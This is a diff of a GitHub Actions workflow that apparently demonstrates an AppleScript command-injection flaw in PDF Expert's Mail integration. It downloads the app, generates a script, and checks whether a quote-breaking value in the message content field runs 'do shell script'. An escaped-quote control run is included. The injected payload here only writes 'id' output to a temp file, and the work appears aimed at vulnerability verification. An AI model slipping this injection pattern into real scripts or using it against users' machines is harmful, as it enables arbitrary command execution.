@@ -6,72 +6,73 @@ on:
 jobs:
   poc:
     runs-on: macos-latest
-    timeout-minutes: 20
+    timeout-minutes: 25
     steps:
       - uses: actions/checkout@v4
 
-      - name: T0 do shell script baseline
-        run: |
-          set +e
-          rm -f /tmp/t0
-          osascript -e 'do shell script "id > /tmp/t0"'
-          echo "exit=$?"
-          echo "T0=[$(cat /tmp/t0 2>/dev/null)]"
+      - name: Host
+        run: sw_vers; uname -m
 
-      - name: T1 injection inside a record no Mail
+      - name: Fetch PDF Expert 1187 from the vendor feed
         run: |
-          set +e
-          rm -f /tmp/t1
-          printf '%s\n' 'set r to {subject:"Invoice", content:"x" & do shell script "id > /tmp/t1" & "" & linefeed & linefeed}' > t1.scpt
-          nl -ba t1.scpt
-          osascript t1.scpt
-          echo "exit=$?"
-          echo "T1=[$(cat /tmp/t1 2>/dev/null)]"
+          set -euo pipefail
+          curl -fsSL -o pex.zip https://downloads.pdfexpert.com/pem3/versions/1187/PDFExpert.zip
+          shasum -a 256 pex.zip | tee zip.sha256
+          unzip -q pex.zip -d app
+          ls -l "app/PDF Expert.app/Contents/MacOS/PDF Expert"
 
-      - name: T2 control escaped quote no Mail
-        run: |
-          set +e
-          rm -f /tmp/t2
-          printf '%s\n' 'set r to {subject:"Invoice", content:"x\" & do shell script \"id > /tmp/t2\" & \"" & linefeed & linefeed}' > t2.scpt
-          nl -ba t2.scpt
-          osascript t2.scpt
-          echo "exit=$?"
-          echo "T2=[$(cat /tmp/t2 2>/dev/null)]"
+      - name: Template literals present in the shipped bytes
+        run: python3 poc/verify_binary.py "app/PDF Expert.app/Contents/MacOS/PDF Expert"
 
-      - name: T3 Mail record with internal timeout
+      - name: Build the script from the binary's own literals
+        run: |
+          set -euo pipefail
+          python3 poc/gen_poc.py --binary "app/PDF Expert.app/Contents/MacOS/PDF Expert" \
+            --cmd "id > /tmp/pdfe_pwned" --field body > generated.scpt
+          echo "--- line 10 ---"; sed -n '10p' generated.scpt
+          echo "--- tokenizer ---"; python3 poc/verify_tokenlevel.py generated.scpt
+          echo "--- compile ---"
+          osacompile -o /tmp/gen.scptd generated.scpt && echo "COMPILE OK" || echo "COMPILE FAILED"
+
+      - name: DECISIVE - execute the generated script
         run: |
           set +e
-          rm -f /tmp/t3
-          printf '%s\n' 'with timeout of 8 seconds' 'tell application "Mail"' 'set newMessage to make new outgoing message with properties {subject:"Invoice", content:"x" & do shell script "id > /tmp/t3" & "" & linefeed & linefeed}' 'end tell' 'end timeout' > t3.scpt
-          nl -ba t3.scpt
-          osacompile -o /tmp/t3c.scpt t3.scpt && echo "T3 COMPILE OK" || echo "T3 COMPILE FAILED"
-          osascript t3.scpt &
+          rm -f /tmp/pdfe_pwned
+          osascript generated.scpt > osa.out 2>&1 &
           PID=$!
-          for i in $(seq 1 30); do kill -0 $PID 2>/dev/null || break; sleep 1; done
-          kill $PID 2>/dev/null
-          echo "T3=[$(cat /tmp/t3 2>/dev/null)]"
+          for i in $(seq 1 40); do [ -s /tmp/pdfe_pwned ] && break; sleep 1; done
+          kill $PID 2>/dev/null; wait $PID 2>/dev/null
+          echo "--- osascript output ---"; cat osa.out
+          echo "--- marker begin ---"; cat /tmp/pdfe_pwned 2>/dev/null; echo "--- marker end ---"
+          if [ -s /tmp/pdfe_pwned ]; then echo "PROOF: do shell script executed"; else echo "NO PROOF"; fi
 
-      - name: T4 Mail version bounded
+      - name: CONTROL - same line, quote escaped, must NOT execute
         run: |
           set +e
-          ls -d /System/Applications/Mail.app >/dev/null 2>&1 && echo "Mail.app present" || echo "Mail.app MISSING"
-          osascript -e 'tell application "Mail" to get version' &
+          rm -f /tmp/pdfe_ctl
+          printf '%s\n' 'tell application "Mail"' \
+            'set newMessage to make new outgoing message with properties {subject:"Invoice", content:"x\" & do shell script \"id > /tmp/pdfe_ctl\" & \"" & linefeed & linefeed}' \
+            'end tell' > ctl.scpt
+          sed -n '2p' ctl.scpt
+          osacompile -o /tmp/ctl.scptd ctl.scpt && echo "CTL COMPILE OK" || echo "CTL COMPILE FAILED"
+          osascript ctl.scpt > ctl.out 2>&1 &
           PID=$!
-          for i in $(seq 1 20); do kill -0 $PID 2>/dev/null || break; sleep 1; done
-          kill $PID 2>/dev/null
-          pgrep -x Mail >/dev/null && echo "Mail running" || echo "Mail not running"
+          for i in $(seq 1 20); do [ -s /tmp/pdfe_ctl ] && break; sleep 1; done
+          kill $PID 2>/dev/null; wait $PID 2>/dev/null
+          echo "--- ctl output ---"; cat ctl.out
+          if [ -s /tmp/pdfe_ctl ]; then echo "CONTROL FAILED: escaped payload executed"; else echo "CONTROL OK: escaped payload did not execute"; fi
 
       - name: Collect
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: iso
+          name: evidence
           path: |
-            t1.scpt
-            t2.scpt
-            t3.scpt
-            /tmp/t0
-            /tmp/t1
-            /tmp/t2
-            /tmp/t3
+            generated.scpt
+            ctl.scpt
+            osa.out
+            ctl.out
+            zip.sha256
+            /tmp/pdfe_pwned
+            /tmp/pdfe_ctl
           if-no-files-found: warn
